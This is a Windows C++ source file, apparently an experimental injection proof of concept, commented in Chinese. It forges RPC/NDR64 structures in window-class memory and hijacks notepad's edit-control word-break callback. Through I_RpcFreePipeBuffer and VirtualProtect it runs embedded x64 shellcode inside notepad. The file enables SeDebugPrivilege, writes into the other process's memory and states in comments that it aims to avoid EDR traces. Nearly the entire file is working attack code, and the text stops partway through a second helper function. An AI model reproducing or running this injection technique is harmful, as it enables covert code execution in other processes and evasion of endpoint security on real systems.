// shit.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "shit.h"
#include <windows.h>
#include <iostream>
#include "teb_def.h"
#include "rpc.h"
PVOID
SundaySearch_ByProcess(HANDLE ProcesHandle, char* pattern, PVOID address,
                       SIZE_T readSize);

PVOID
LookupTagClsAddressByProcess(HANDLE ProcessHandle) {
#ifdef _WIN64
#define START_ADDRESS (PVOID)0x00000000010000
#define END_ADDRESS (0x00007FF8F2580000 - 0x00000000010000)
#else
#define START_ADDRESS (PVOID)0x10000
#define END_ADDRESS (0x7FFF0000 - 0x10000)
#endif
    typedef LONG(NTAPI * FnZwQueryVirtualMemory)(HANDLE, PVOID, int, PVOID,
                                                 SIZE_T, PSIZE_T);
    static FnZwQueryVirtualMemory ZwQueryVirtualMemory =
        (FnZwQueryVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll.dll"),
                                               "ZwQueryVirtualMemory");
    if (!ZwQueryVirtualMemory) {
        std::cerr << "ZwQueryVirtualMemory GetProcAddress failed: "
                  << GetLastError() << std::endl;
        return 0;
    }
    MEMORY_BASIC_INFORMATION MemoryBasicInfo = {0};
    PVOID CurrentAddress = START_ADDRESS;
    uint64_t TheTagClsAddress = 0;
    SIZE_T BytesReturned = 0;

    while (true) {
        BOOLEAN ContinueEnum = FALSE;

        RtlZeroMemory(&MemoryBasicInfo, sizeof(MemoryBasicInfo));

        auto ntStatus = ZwQueryVirtualMemory(
            ProcessHandle, CurrentAddress, 0, &MemoryBasicInfo,
            sizeof(MEMORY_BASIC_INFORMATION), &BytesReturned);

        if (ntStatus != 0) break;

        do {
            if (MemoryBasicInfo.State != MEM_COMMIT) {
                break;
            }
            if (MemoryBasicInfo.Type != MEM_PRIVATE &&
                MemoryBasicInfo.Type != MEM_MAPPED) {
                break;
            }

            // 自己的是PAGE_READWRITE 别人的是PAGE_READONLY
            if (MemoryBasicInfo.Protect != PAGE_READONLY) {
                break;
            }

            TheTagClsAddress = (uint64_t)SundaySearch_ByProcess(
                ProcessHandle, (char*)"13 37 CC A0 A0 68 75 6F 6A 69",
                (UCHAR*)CurrentAddress, MemoryBasicInfo.RegionSize);
            if (TheTagClsAddress != NULL) {
                break;
            }

        } while (FALSE);
        if (TheTagClsAddress != 0) {
            break;
        }
        CurrentAddress = (PVOID)((ULONG_PTR)MemoryBasicInfo.BaseAddress +
                                 MemoryBasicInfo.RegionSize);
    }
    return (PVOID)TheTagClsAddress;
}

void printHex(const char* name, const void* data, size_t size) {
    printf("%s: ", name);
    const unsigned char* byteData = (const unsigned char*)data;
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", byteData[i]);
    }
    printf("\n");
}

struct _NDR64_PARAM_FLAGS {
    unsigned __int16 MustSize : 1;
    unsigned __int16 MustFree : 1;
    unsigned __int16 IsPipe : 1;
    unsigned __int16 IsIn : 1;
    unsigned __int16 IsOut : 1;
    unsigned __int16 IsReturn : 1;
    unsigned __int16 IsBasetype : 1;
    unsigned __int16 IsByValue : 1;
    unsigned __int16 IsSimpleRef : 1;
    unsigned __int16 IsDontCallFreeInst : 1;
    unsigned __int16 SaveForAsyncFinish : 1;
    unsigned __int16 IsPartialIgnore : 1;
    unsigned __int16 IsForceAllocate : 1;
    unsigned __int16 Reserved : 2;
    unsigned __int16 UseCache : 1;
};
typedef const void* PNDR64_FORMAT;
typedef struct _NDR64_PARAM_FORMAT {
    void* Type;
    _NDR64_PARAM_FLAGS Attributes;
    unsigned __int16 Reserved;
    unsigned __int32 StackOffset;
};
/*
.rdata:00007FFF3A2784E0 ?Ndr64SimpleTypeBufferSize@@3QBEB db 0  ; DATA XREF:
Ndr64ComplexStructBufferSize(_MIDL_STUB_MESSAGE *,uchar *,void const
*)+31B↑o .rdata:00007FFF3A2784E0                                         ;
Ndr64UnionBufferSize(_MIDL_STUB_MESSAGE *,uchar *,void const *)+B8↑o ...
.rdata:00007FFF3A2784E1 db    1
.rdata:00007FFF3A2784E2 db    1
.rdata:00007FFF3A2784E3 db    2
.rdata:00007FFF3A2784E4 db    2
.rdata:00007FFF3A2784E5 db    4
.rdata:00007FFF3A2784E6 db    4
.rdata:00007FFF3A2784E7 db    8
.rdata:00007FFF3A2784E8 db    8
*/
enum class _Ndr64SimpleTypeBUfferSizeMap {
    kChar = 0,
    kShort = 2,
    kint32 = 4,
    kint64 = 6
};
void PrivilegeEscalation() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                     &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = luid;
    AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
}
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine,
                      _In_ int nCmdShow) {
    PrivilegeEscalation();
    // 创建notepad进程,泄露就泄露了 去他妈的
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (!CreateProcess(L"L:\\Windows\\system32\\notepad.exe", NULL, NULL, NULL,
                       FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }
    // 等完全起来
    WaitForInputIdle(pi.hProcess, INFINITE);

    // 获取notepad进程中edit窗口的句柄
    HWND hwndNotepad = FindWindow(L"Notepad", NULL);
    HWND hwndEdit = FindWindowEx(hwndNotepad, NULL, L"Edit", NULL);
    if (!hwndEdit) {
        std::cerr << "FindWindowEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 注册一个带有额外类内存的窗口类
    // https://learn.microsoft.com/en-us/windows/win32/winmsg/about-window-classes?redirectedfrom=MSDN
    WNDCLASSEX wcex = {sizeof(wcex)};
    wcex.lpfnWndProc = DefWindowProc;
    wcex.cbClsExtra = wcex.cbWndExtra = 1024 * 64;
    wcex.lpszClassName = L"CustomWindowClass";
    wcex.hInstance = hInstance;
    if (!RegisterClassEx(&wcex)) {
        std::cerr << "RegisterClassEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 创建一个仅消息窗口
    HWND hwndMessage =
        CreateWindowExW(0, L"CustomWindowClass", NULL, 0, 0, 0, 0, 0,
                        HWND_MESSAGE, NULL, hInstance, NULL);
    if (!hwndMessage) {
        std::cerr << "CreateWindowEx failed: " << GetLastError() << std::endl;
        return 1;
    }
    ShowWindow(hwndMessage, SW_SHOW);
    UpdateWindow(hwndMessage);
#ifdef _WIN64
    typedef LONG(NTAPI * FnNtUserSetClassLong)(HWND hWnd, INT Offset,
                                               LONG64 dwNewLong, BOOL Ansi);
#else
    typedef LONG(NTAPI * FnNtUserSetClassLong)(HWND hWnd, INT Offset,
                                               LONG dwNewLong, BOOL Ansi);

#endif  // _WIN64

    FnNtUserSetClassLong NtUserSetClassLong =
        (FnNtUserSetClassLong)GetProcAddress(LoadLibrary(L"win32u.dll"),
                                             "NtUserSetClassLong");

    if (!NtUserSetClassLong) {
        std::cerr << "NtUserSetClassLong GetProcAddress failed: "
                  << GetLastError() << std::endl;
        return 1;
    }

    /*
    typedef LONG(NTAPI* FnNtUserSetClassLongPtr)(HWND hwnd, INT offset, LONG_PTR
    newval, BOOL ansi); FnNtUserSetClassLongPtr NtUserSetClassLongPtr =
    (FnNtUserSetClassLongPtr)GetProcAddress(LoadLibrary(L"win32u.dll"),
    "NtUserSetClassLongPtr");

    if (!NtUserSetClassLongPtr) {
        std::cerr << "NtUserSetClassLongPtr GetProcAddress failed: " <<
    GetLastError() << std::endl; return 1;
    }
    */
    const char shitInput[] = {0x13, 0x37, 0xCC, 0xA0, 0xA0,
                              0x68, 0x75, 0x6f, 0x6a, 0x69};
    // https://github.com/wine-mirror/wine/blob/1134834b7478632da9c60f36d4a7cf254729242c/dlls/win32u/class.c#L705
    // offset = 0
    for (size_t i = 0; i < sizeof(shitInput); i++) {
        NtUserSetClassLong(hwndMessage, i, shitInput[i], FALSE);
    }
    // 通过查找TEB->Win32ClientInfo->phkCurrent结构下的AllocationBase来确定窗口内存的基址
    // 只是缩小范围,其实不如直接virtualqueryex,我实在是不知道这里要怎么定位到notepad的地址.如果用win32
    // api edr绝对有痕迹 这里就是用readmemory
    auto TheTagClsAddress = LookupTagClsAddressByProcess((HANDLE)-1);
    if (TheTagClsAddress == 0) {
        std::cerr << "TheTagClsAddress failed: " << GetLastError() << std::endl;
        return 1;
    }
    auto TheNotepadTagClsAddress = LookupTagClsAddressByProcess(pi.hProcess);
    if (TheNotepadTagClsAddress == 0) {
        std::cerr << "TheNotepadTagClsAddress failed: " << GetLastError()
                  << std::endl;
        return 1;
    }
    for (size_t i = 0; i < sizeof(shitInput); i++) {
        NtUserSetClassLong(hwndMessage, i, 0x0, FALSE);
    }
    // 这个作者抄了这玩意
    // https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/
    // https://github.com/odzhan/injection/blob/master/eminject/poc.c#L38

    /*
    RPC_STATUS __stdcall I_RpcFreePipeBuffer(RPC_MESSAGE *Message) {
      (*(void (__fastcall **)(RPC_BINDING_HANDLE, RPC_MESSAGE *))(*(_QWORD
    *)Message->Handle + 0x80))( //Message->Handle + 0x80 = NdrServerCallAll
        Message->Handle, // Message->Handle = PRPC_MESSAGE pRpcMsg
        Message);
      return 0;
    }
    */

    /*
    void __stdcall NdrServerCallAll(PRPC_MESSAGE pRpcMsg)
    {
          struct _MIDL_SERVER_INFO_ **RpcInterfaceInformation; // rax
          unsigned int v2; // [rsp+50h] [rbp+8h] BYREF

          RpcInterfaceInformation = (struct _MIDL_SERVER_INFO_
    **)pRpcMsg->RpcInterfaceInformation; v2 = 0;
          ((void (__stdcall *)(void *, void *, struct _RPC_MESSAGE *, struct
    _MIDL_SERVER_INFO_ *, int (*const *)(void), struct _MIDL_SYNTAX_INFO *,
    unsigned int *))Ndr64StubWorker)( 0i64, 0i64, pRpcMsg,
            RpcInterfaceInformation[0xA],
            RpcInterfaceInformation[0xA]->DispatchTable,
            RpcInterfaceInformation[0xA]->pSyntaxInfo + 1,
            &v2);
    }
    */
    // 不可以用NdrServerCall2的原因是需要调用PerformRpcInitialization。
    const auto hRpcRt4 = LoadLibraryA("rpcrt4.dll");

    const auto theNdrServerCallAllAddress =
        (uint64_t)GetProcAddress(hRpcRt4, "NdrServerCallAll");

    const auto theI_RpcFreePipeBufferAddr =
        GetProcAddress(hRpcRt4, "I_RpcFreePipeBuffer");
    const auto theVirtualProtectAddr = (void*)VirtualProtect;

    // PRPC_MESSAGE->Handle
    /*
    const auto fnInitRpcMessageHandle = [&](void* localStartAddress, void*
    remoteStartAddress, void* callAddress) -> void { static const auto maxSize =
    sizeof(RPC_MESSAGE) + 0x100 + 0x80 + 0x80; const auto tempBuffer = new
    char[maxSize]; memset(tempBuffer, 0x0, maxSize); const auto
    remote_notepad_rpc_Message = (PRPC_MESSAGE)((uint64_t)remoteStartAddress);
        const auto remote_notepad_rpc_Message_handle =
    (void*)((uint64_t)remote_notepad_rpc_Message + sizeof(RPC_MESSAGE));
    //这里会是RPC_MESSAGE开头

        const auto remote_notepad_rpc_RpcInterfaceInformation =
    (void*)((uint64_t)remote_notepad_rpc_Message_handle + 0x100); const auto
    remote_notepad_rpc_RpcInterfaceInformation_DisPathTable =
    (void*)((uint64_t)remote_notepad_rpc_RpcInterfaceInformation + 0x80); const
    auto remote_notepad_rpc_RpcInterfaceInformation_DisPathTable_Dispath =
    (void*)((uint64_t)remote_notepad_rpc_RpcInterfaceInformation_DisPathTable +
    0x80);

        const auto local_rpc_Message = (PRPC_MESSAGE)((uint64_t)tempBuffer);
        const auto local_rpc_Message_handle =
    (void*)((uint64_t)local_rpc_Message +
    sizeof(RPC_MESSAGE));//这里会是RPC_MESSAGE开头,很重要,给后面的local_rpc_dispath_table_dispath_table用

        const auto local_rpc_RpcInterfaceInformation =
    (void*)((uint64_t)local_rpc_Message_handle + sizeof(RPC_MESSAGE) + 0x100);
        const auto local_rpc_RpcInterfaceInformation_DisPathTable =
    (void*)((uint64_t)local_rpc_RpcInterfaceInformation + 0x80); const auto
    local_rpc_RpcInterfaceInformation_DisPathTable_Dispath =
    (void*)((uint64_t)local_rpc_RpcInterfaceInformation_DisPathTable + 0x80);

        local_rpc_Message->ProcNum = 0; //这里填0
        local_rpc_Message->RpcInterfaceInformation =
    (void**)remote_notepad_rpc_RpcInterfaceInformation;
        local_rpc_Message->Handle = (void*)remote_notepad_rpc_Message_handle;
        // 填第一次Message->Handle + 0x80的地址 :
        *(uint64_t*)((uint64_t)local_rpc_Message_handle + 0x80) =
    theNdrServerCallAllAddress;

        auto wtf = ((uint64_t)local_rpc_RpcInterfaceInformation + 0xA0 *
    sizeof(void*));
        *(uint32_t*)(wtf + 0x0) = 0x80;//长度
        *(uint64_t*)(wtf + 0x8) =
            (uint64_t)remote_notepad_rpc_RpcInterfaceInformation_DisPathTable;//dispathPath(也是一个数组)

        auto local_rpc_dispath_table =
    (uint64_t*)(local_rpc_RpcInterfaceInformation_DisPathTable);
        *(uint32_t*)((uint64_t)local_rpc_dispath_table + 0x0) = 1;//
    dispath_count
        *(uint64_t*)((uint64_t)local_rpc_dispath_table + 0x4) =
    (uint64_t)remote_notepad_rpc_RpcInterfaceInformation_DisPathTable_Dispath;
    // dispath_dispath

        auto local_rpc_dispath_table_dispath_table =
    (uint64_t*)(local_rpc_RpcInterfaceInformation_DisPathTable_Dispath);
        *(uint64_t*)((uint64_t)local_rpc_dispath_table_dispath_table + 0x0) =
    (uint64_t)callAddress; memcpy(tempBuffer, local_rpc_Message, maxSize);
        // +8的原因是里面会读一次RCX这个傻逼指针,所以+8是给RCX指针的 32位给4
        auto baseIndex = (uint64_t)localStartAddress + 0x8 -
    (uint64_t)TheTagClsAddress; for (size_t i = 0; i < maxSize; i++)
        {
            NtUserSetClassLong(hwndMessage, i + baseIndex, tempBuffer[i],
    FALSE);
        }
        delete[] tempBuffer;
    };
    */
    // const auto localrpcMessage = (PRPC_MESSAGE)((uint64_t)TheTagClsAddress +
    // 0x8); const auto remoterpcMessage =
    // (PRPC_MESSAGE)((uint64_t)TheNotepadTagClsAddress + 0x8);
    // +8的原因是里面会读一次RCX这个傻逼指针,所以+8是给RCX指针的 32位给4

    /*
    fnInitRpcMessageHandle((void*)((uint64_t)TheTagClsAddress),
        (void*)((uint64_t)TheNotepadTagClsAddress),
        (void*)theNdrServerCallAllAddress);
    */

    // const auto local_rpc_Message_handle22 = (void*)((uint64_t)localrpcMessage
    // + sizeof(RPC_MESSAGE));
    // 现在再填一次local_rpc_Message_handle
    // fnInitRpcMessageHandle((void*)localrpcMessage->Handle,
    // (void*)remoterpcMessage, (void*)theVirtualProtectAddr);
    // +0指向自己 +8的地方
    // *(uint64_t*)((uint64_t)TheTagClsAddress + 0x0) =
    // (uint64_t)localrpcMessage;

    /*
    char tempBuffer[8];
    memcpy(tempBuffer, &remoterpcMessage, 8);
    for (size_t i = 0; i < 8; i++)
    {
        NtUserSetClassLong(hwndMessage, i, tempBuffer[i], FALSE);
    }
    */
    const auto allocShellcodeSize = 2048;
    char* tmpShellcode = (char*)malloc(allocShellcodeSize);
    memset(tmpShellcode, 0, allocShellcodeSize);
    char* editShellcode = (char*)malloc(allocShellcodeSize);
    memset(editShellcode, 0, allocShellcodeSize);
    // I_RpcFreePipeBuffer(Message)

    // Message = EditControlPtr
    // Message->Handle = Shellcode
    // *Message->Handle = Shellcode
    *(ULONG_PTR*)tmpShellcode = (ULONG_PTR)TheNotepadTagClsAddress;

    // *Message->Handle + 0x80 = NdrServerCallAll
    *(ULONG_PTR*)(tmpShellcode + 0x80) = (ULONG_PTR)theNdrServerCallAllAddress;

#define REMOTE_CLS_ADDRESS(x)                   \
    ((ULONG_PTR)(x) - (ULONG_PTR)tmpShellcode + \
     (ULONG_PTR)TheNotepadTagClsAddress)

    // NdrServerCallAll(pRpcMsg)
    // pRpcMsg = Shellcode
    RPC_MESSAGE* RpcMsg0 = (RPC_MESSAGE*)tmpShellcode;
    RPC_SERVER_INTERFACE* RpcInterfaceInfo0 =
        (RPC_SERVER_INTERFACE*)(tmpShellcode + 0x88);
    MIDL_SERVER_INFO* RpcSrvInfo0 =
        (MIDL_SERVER_INFO*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE));
    PVOID* DispatchTable0 =
        (PVOID*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                 sizeof(MIDL_SERVER_INFO));
    MIDL_SYNTAX_INFO* SyntaxInfo0 =
        (MIDL_SYNTAX_INFO*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                            sizeof(MIDL_SERVER_INFO) + sizeof(PVOID));
    MIDL_STUB_DESC* StubDesc0 =
        (MIDL_STUB_DESC*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                          sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                          sizeof(MIDL_SYNTAX_INFO) * 2);
    ULONG_PTR* FmtStrOffset0 =
        (ULONG_PTR*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                     sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                     sizeof(MIDL_SYNTAX_INFO) * 2 + sizeof(MIDL_STUB_DESC));
    NDR64_PROC_FORMAT* ProcStr0 =
        (NDR64_PROC_FORMAT*)(tmpShellcode + 0x88 +
                             sizeof(RPC_SERVER_INTERFACE) +
                             sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                             sizeof(MIDL_SYNTAX_INFO) * 2 +
                             sizeof(MIDL_STUB_DESC) + sizeof(ULONG_PTR));

    //_NDR_PROC_CONTEXT Ndr+Proc
    DispatchTable0[0] = (PVOID)theNdrServerCallAllAddress;
    RpcSrvInfo0->DispatchTable =
        (SERVER_ROUTINE*)REMOTE_CLS_ADDRESS(DispatchTable0);

    FmtStrOffset0[0] = (ULONG_PTR)REMOTE_CLS_ADDRESS(ProcStr0);
    (SyntaxInfo0 + 1)->FmtStringOffset =
        (USHORT*)REMOTE_CLS_ADDRESS(FmtStrOffset0);
    RpcSrvInfo0->pSyntaxInfo =
        (MIDL_SYNTAX_INFO*)REMOTE_CLS_ADDRESS(SyntaxInfo0);
    RpcSrvInfo0->pStubDesc = (MIDL_STUB_DESC*)REMOTE_CLS_ADDRESS(StubDesc0);
    RpcSrvInfo0->DispatchTable =
        (SERVER_ROUTINE*)REMOTE_CLS_ADDRESS(DispatchTable0);
    // RpcSrvInfo0->FmtStringOffset = (unsigned short*)0x1337;
    RpcSrvInfo0->ProcString = (PFORMAT_STRING)0xAAAA;


    RpcInterfaceInfo0->InterpreterInfo =
        (MIDL_SERVER_INFO*)REMOTE_CLS_ADDRESS(RpcSrvInfo0);
    RpcMsg0->RpcInterfaceInformation =
        (RPC_SERVER_INTERFACE*)REMOTE_CLS_ADDRESS(RpcInterfaceInfo0);
    RpcMsg0->ProcNum = 0;
    RpcMsg0->RpcFlags = 0x1000;

    // rpcmsg0->Handle的handle已经在上面设置为TheNotepadTagClsAddress了.所以要在TheNotepadTagClsAddress
    // + 0x100的位置设置virtualprotect
    *(ULONG_PTR*)(tmpShellcode + 0x100) =
        (ULONG_PTR)VirtualProtect;  // 为了通过Ndr64pServerUnMarshal最后的那一段
    //*(ULONG_PTR*)(tmpShellcode + 0x160) = (ULONG_PTR)tempVar;
    ////为了通过Ndr64pServerUnMarshal最后的那一段


    auto calcOffset = 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                      sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                      sizeof(MIDL_SYNTAX_INFO) * 2 + sizeof(MIDL_STUB_DESC) +
                      sizeof(ULONG_PTR) + sizeof(NDR64_PROC_FORMAT);
    // auto remoteCallAddr = REMOTE_CLS_ADDRESS(tmpShellcode + calcOffset);
    //*(ULONG_PTR*)(tmpShellcode + calcOffset) = remoteCallAddr;
    // calcOffset += sizeof(ULONG_PTR);

    /*
    * https://github.com/ufwt/windows-XP-SP1/blob/d521b6360fcff4294ae6c5651c539f1b9a6cbb49/XPSP1/NT/com/rpc/ndr64/mulsyntx.cxx#L1152
    if (  pParamFlags->IsIn     ||
            (pParamFlags->IsReturn && !pNdr64Flags->HasComplexReturn) ||
            pParamFlags->IsPipe )
        continue;
    */
    std::vector<_NDR64_PARAM_FORMAT*> theParamTypeAddress;
    // type的指针,这个type会读两次 **typeaddr
    auto fnSetNdr64Param = [&]() {
        static auto currentCopyCount = 0;
        auto ndr64Param = (_NDR64_PARAM_FORMAT*)(tmpShellcode + calcOffset);
        ndr64Param->Attributes.IsIn = true;
        ndr64Param->Attributes.IsBasetype = true;
        // auto typeAddress = tmpShellcode + calcOffset;
        // theParamTypeAddress.push_back(typeAddress);
        // ndr64Param->Type = (void*)REMOTE_CLS_ADDRESS(typeAddress);
        ndr64Param->StackOffset = currentCopyCount * 4;
        currentCopyCount += 1;
        // 这个没用,因为不走IsSimpleRef,simpleref那段内存是read only没办法赋值
        // https://github.com/ufwt/windows-XP-SP1/blob/d521b6360fcff4294ae6c5651c539f1b9a6cbb49/XPSP1/NT/com/rpc/ndr64/srvcall.cxx#L694C31-L694C43
        //*(char*)(typeAddress) = (char)_Ndr64SimpleTypeBUfferSizeMap::kint64;
        // calcOffset += sizeof(_NDR64_PARAM_FORMAT);
        theParamTypeAddress.push_back(ndr64Param);
        calcOffset += sizeof(_NDR64_PARAM_FORMAT);
    };

    const auto virtualProtectParamSize = 8 * 4;
    for (size_t i = 0; i < virtualProtectParamSize / 4; i++) {
        fnSetNdr64Param();
    }
    auto paramsBuffer = tmpShellcode + calcOffset;
    // 设置参数
    RpcMsg0->Buffer = (void*)REMOTE_CLS_ADDRESS(paramsBuffer);
    RpcMsg0->BufferLength = virtualProtectParamSize;  // virtualprotect的参数
    calcOffset += RpcMsg0->BufferLength;

    // Make HandleType to 0
    ProcStr0->Flags = 1;
    ProcStr0->StackSize = virtualProtectParamSize;
    ProcStr0->NumberOfParams = RpcMsg0->BufferLength / 4;

    // https://www.exploit-db.com/shellcodes/49819
    //  没办法把shellcode写到cls内存里面,因为那个是map的属性.所以提前写到编辑框里面
    unsigned char payload[] =
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b"
        "\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08"
        "\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24"
        "\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6"
        "\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96"
        "\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e"
        "\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";
    // const auto shellcodeAddress = tmpShellcode + calcOffset;
    // memcpy(shellcodeAddress, payload, sizeof(payload));
    // calcOffset += sizeof(payload);

    // typedef LONG(NTAPI* FnNtUserMessageCall)(HWND hWnd, UINT msg, WPARAM
    // wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii);
    // FnNtUserMessageCall NtUserMessageCall =
    // (FnNtUserMessageCall)GetProcAddress(LoadLibrary(L"win32u.dll"),
    // "NtUserMessageCall");
    //
    //  执行payload
    //  1.给回调设置参数为我们的payload
    //  SendMessageA才生效,不知道为什么,否则会报60
    auto result1 =
        SendMessageA(hwndEdit, WM_SETTEXT, 0, (LPARAM)&TheNotepadTagClsAddress);
    // auto result1 = NtUserMessageCall(hwndEdit, WM_SETTEXT, 0,
    // (LPARAM)&TheNotepadTagClsAddress, 0, 0x2B1, 1);
    //  等完全输入完毕
    WaitForInputIdle(pi.hProcess, INFINITE);
    result1 = PostMessageA(hwndEdit, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0);

    // ***这里有个限制 除非我是英文系统 否则会被格式为Utf-8导致不能用**
    // 我直接writememory让那个地方看起来像是英文系统
    auto emh = (PVOID)SendMessage(hwndEdit, EM_GETHANDLE, 0, 0);
    PVOID embuf;
    SIZE_T numOfWrite;
    ReadProcessMemory(pi.hProcess, emh, &embuf, sizeof(ULONG_PTR), &numOfWrite);
    WriteProcessMemory(pi.hProcess, embuf, &TheNotepadTagClsAddress, 8,
                       &numOfWrite);
    WriteProcessMemory(pi.hProcess, (char*)((uint64_t)embuf + 8), payload,
                       sizeof(payload), &numOfWrite);
    const auto shellcodeAddress = (uint64_t)embuf + 8;
    const auto virtualProtectReturnValue = shellcodeAddress + sizeof(payload);
    const auto editShellcodeLocation = shellcodeAddress + sizeof(payload) + sizeof(uint64_t);
    /*
    _In_  LPVOID lpAddress,
    _In_  SIZE_T dwSize,
    _In_  DWORD flNewProtect,
    _Out_ PDWORD lpflOldProtect
    */
    auto tempCover = (uint64_t)TheNotepadTagClsAddress;
    memcpy(paramsBuffer, &tempCover, 8);

    tempCover = (uint64_t)sizeof(payload);
    memcpy(paramsBuffer + 8, &tempCover, 8);

    tempCover = (uint64_t)PAGE_EXECUTE_READWRITE;
    memcpy(paramsBuffer + 8 + 8, &tempCover, 8);
    // 这个地方是readonly的,如果直接传给virtualprotect会失败.所以也得放在编辑框里面
    /*
    auto oldProtectAddress = (uint64_t)REMOTE_CLS_ADDRESS(tmpShellcode +
    calcOffset); tempCover = (uint64_t)tmpShellcode + calcOffset;
    memcpy(paramsBuffer + 8 + 8 + 8, &oldProtectAddress, 8);
    calcOffset += sizeof(uint64_t);
    *(uint64_t*)tempCover = (uint64_t)REMOTE_CLS_ADDRESS((uint64_t)(tmpShellcode
    + calcOffset)); calcOffset += sizeof(uint64_t);
    */
    memcpy(paramsBuffer + 8 + 8 + 8, &virtualProtectReturnValue, 8);
    calcOffset += sizeof(uint64_t);

    for (auto ndr64Param : theParamTypeAddress) {
        auto typeAddress = tmpShellcode + calcOffset;
        ndr64Param->Type = (void*)REMOTE_CLS_ADDRESS(typeAddress);
        calcOffset += sizeof(void*);

        *(char*)(typeAddress) = (char)_Ndr64SimpleTypeBUfferSizeMap::kint64;
        calcOffset += sizeof(char);
    }
    for (size_t i = 0; i < allocShellcodeSize; i++) {
        NtUserSetClassLong(hwndMessage, i, tmpShellcode[i], FALSE);
    }

    // 2.设置I_RpcFreePipeBuffer为回调地址
    // bp rpcrt4!I_RpcFreePipeBuffer
    result1 = PostMessageA(hwndEdit, EM_SETWORDBREAKPROC, 0,
                           (LPARAM)theI_RpcFreePipeBufferAddr);

    // 3. 激活
    result1 = PostMessageA(hwndEdit, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0);
    // 4. cleanup
    SendMessage(hwndEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);

    // SendMessageA(hwndEdit, WM_SETTEXT, 0, (LPARAM)INJPATH);
    // SendMessageW(hwndEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
    return 0;
}
void buildEditShellCode(char* tmpShellcode, uint64_t editShellcodeLocation, uint64_t theNdrServerCallAllAddress) {

    //第二个shellcode在编辑框里面,负责call virtualprotect 
    *(ULONG_PTR*)tmpShellcode = (ULONG_PTR)editShellcodeLocation;

    // *Message->Handle + 0x80 = NdrServerCallAll
    *(ULONG_PTR*)(tmpShellcode + 0x80) = (ULONG_PTR)theNdrServerCallAllAddress;

#define REMOTE_EDIT_ADDRESS(x)                   \
    ((ULONG_PTR)(x) - (ULONG_PTR)tmpShellcode + \
     (ULONG_PTR)editShellcodeLocation)
    RPC_MESSAGE* RpcMsg0 = (RPC_MESSAGE*)tmpShellcode;
    RPC_SERVER_INTERFACE* RpcInterfaceInfo0 =
        (RPC_SERVER_INTERFACE*)(tmpShellcode + 0x88);
    MIDL_SERVER_INFO* RpcSrvInfo0 =
        (MIDL_SERVER_INFO*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE));
    PVOID* DispatchTable0 =
        (PVOID*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
            sizeof(MIDL_SERVER_INFO));
    MIDL_SYNTAX_INFO* SyntaxInfo0 =
        (MIDL_SYNTAX_INFO*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
            sizeof(MIDL_SERVER_INFO) + sizeof(PVOID));
    MIDL_STUB_DESC* StubDesc0 =
        (MIDL_STUB_DESC*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
            sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
            sizeof(MIDL_SYNTAX_INFO) * 2);
    ULONG_PTR* FmtStrOffset0 =
